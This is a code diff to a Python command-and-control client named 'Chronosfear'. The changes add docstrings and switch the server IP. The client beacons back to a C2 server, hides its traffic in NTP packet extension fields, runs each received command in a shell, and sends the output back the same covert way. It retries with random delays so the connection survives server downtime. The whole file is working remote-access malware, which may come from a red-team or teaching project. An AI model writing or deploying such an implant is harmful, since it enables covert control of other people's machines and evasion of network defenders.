@@ -1,13 +1,25 @@
+"""
+CHRONOSFEAR C2 Client
+Author: Caroline Richards
+
+This client connects back to the Chronosfear C2 server and listens for commands.
+"""
+
 import socket
 import struct
 import subprocess
 import time
 import random
 
-server_address = "192.168.0.10"
+server_address = "192.168.1.159"
 server_port = 123
 client = None
 
+"""
+This function attempts to connect to the server. 
+If the connection fails it waits a random amount of time between 5 and 15 seconds before retrying, 
+ensuring that if the server is downed clients can reconnect when it comes back up
+"""
 def connect_to_server():
     global client
     while True: 
@@ -22,7 +34,9 @@ def connect_to_server():
             print(f"Connection refused, retrying in {wait_time} seconds...")
             time.sleep(wait_time)
 
-
+"""
+This function creates an NTP packet with the given message in an extension field.
+"""
 def make_ntp_packet(message):
     header = struct.pack("!B B B b 11I", 0b00100011, 1, 0, 0, *(0 for _ in range(11)))
     ext_type = 0xC0DE
@@ -36,6 +50,9 @@ def make_ntp_packet(message):
     packet = header + ext
     return packet
 
+"""
+This function parsees an NTP packet and extracts the command in the extension field.
+"""
 def parse_ntp_packet(buf: bytes, offset: int = 48):
     results = []
     while offset + 4 <= len(buf):
@@ -53,11 +70,17 @@ def parse_ntp_packet(buf: bytes, offset: int = 48):
         offset += ext_len
     return results
 
+"""
+This function sends a response back to the server by creating an NTP packet with the response from the executed command. 
+"""
 def send_response(response):
     print("Sending response back to server...")
     ntp_packet = make_ntp_packet(response)
     client.send(ntp_packet)
 
+"""
+This function handles incoming data-- data is parse as an NTP packet, commands are run in a shell, and the response is returned to the server.
+"""
 def handle_data(data):
     try: 
         exts = parse_ntp_packet(data)
@@ -72,6 +95,9 @@ def handle_data(data):
     except Exception as e:
         print(f"Error parsing NTP packet: {e}")
 
+"""
+This function listens for messages from the server. If the connection is lost, it attempts to reconnect.
+"""
 def receive_messages():
     global client
     print("Now listening...")
